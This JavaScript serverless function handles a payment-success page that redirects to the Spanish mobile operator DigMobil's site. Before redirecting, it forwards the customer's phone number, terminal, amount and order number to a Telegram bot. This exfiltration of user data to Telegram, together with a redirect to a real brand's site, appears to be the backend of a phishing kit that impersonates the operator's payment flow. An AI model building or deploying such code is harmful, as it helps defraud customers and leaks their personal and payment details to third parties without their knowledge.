const { sendToTelegram } = require('./utils/telegram');

exports.handler = async (event, context) => {
  const url = new URL(event.rawUrl || `https://${event.headers.host}${event.path}`);
  const sessionId = url.searchParams.get('session_id');
  const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';

  let phoneNumber = 'Not Provided';
  let terminal = 'Unknown';
  let amount = 'Unknown';
  let orderNumber = 'Unknown';

  console.log('Payment success - Session ID:', sessionId);
  
  // Отримуємо інформацію про платіж із глобальної змінної
  if (global.paymentInfo && global.paymentInfo[sessionId]) {
    const paymentData = global.paymentInfo[sessionId];
    phoneNumber = paymentData.phoneNumber;
    terminal = paymentData.terminal;
    amount = paymentData.amount;
    orderNumber = paymentData.orderNumber;
    console.log('Found payment data:', paymentData);
    
    // Видаляємо інформацію після використання
    delete global.paymentInfo[sessionId];
  } else {
    console.log('No payment data found for session:', sessionId);
  }

  // Надсилаємо дані в Telegram
  await sendToTelegram(phoneNumber, terminal, amount, orderNumber);

  const html = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3;url=https://www.digmobil.es/"> <!-- Redirect after 3 seconds -->
    <title>Payment Successful</title>
    <style>
      body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
      .container { padding: 30px; border: 1px solid #ddd; border-radius: 8px; }
      h1 { color: #4CAF50; }
      .btn { background-color: #4CAF50; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Payment Successful</h1>
      <p>Your payment was processed successfully.</p>
      <p>Redirecting to DigMobil in 3 seconds...</p>
      <a href="https://www.digmobil.es/" class="btn">Return to Account</a> <!-- Updated href -->
    </div>
  </body>
  </html>
  `;

  return {
    statusCode: 200,
    headers: { 
      'Content-Type': 'text/html;charset=UTF-8', 
      'Access-Control-Allow-Origin': '*' 
    },
    body: html
  };
};